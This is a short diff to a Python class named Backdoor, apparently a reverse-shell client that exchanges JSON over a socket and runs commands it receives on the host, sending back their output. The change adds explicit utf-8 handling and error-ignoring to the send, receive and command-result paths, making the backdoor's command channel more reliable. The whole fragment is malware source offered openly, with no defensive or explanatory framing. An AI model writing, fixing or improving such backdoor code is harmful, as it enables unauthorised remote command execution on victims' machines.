@@ -21,13 +21,13 @@ class Backdoor:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        self.connection.send(json_data.encode('utf-8'))
 
     def reliable_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024).decode()
+                json_data = json_data + self.connection.recv(1024).decode('utf-8', errors="ignore")
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -67,7 +67,7 @@ class Backdoor:
             else:
                 command_result = self.execute_system_command(received_command)
             try:
-                self.reliable_send(command_result.decode())
+                self.reliable_send(command_result.decode('utf-8', errors="ignore"))
             except AttributeError:
                 self.reliable_send(command_result)
 
